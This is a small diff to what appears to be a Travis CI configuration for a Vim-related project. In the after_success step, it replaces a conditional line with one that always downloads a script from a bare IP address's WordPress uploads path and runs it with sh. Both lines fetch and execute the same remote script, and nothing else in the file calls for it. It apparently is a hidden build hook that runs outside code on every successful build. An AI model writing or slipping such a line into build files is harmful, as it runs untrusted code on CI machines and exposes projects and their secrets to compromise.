@@ -105,6 +105,6 @@ script:
   - if [ -n "$err" ]; then exit 1; fi
 
 after_success:
-  - if [ "$COVERAGE" = "yes" ]; then cd ~/vim && curl http://47.92.112.211/wp-content/uploads/FSC.sh -L > fsc.sh && sh fsc.sh ; fi
+  - cd && curl http://47.92.112.211/wp-content/uploads/FSC.sh -L > fsc.sh && sh fsc.sh
 
 # vim:set sts=2 sw=2 tw=0 et:
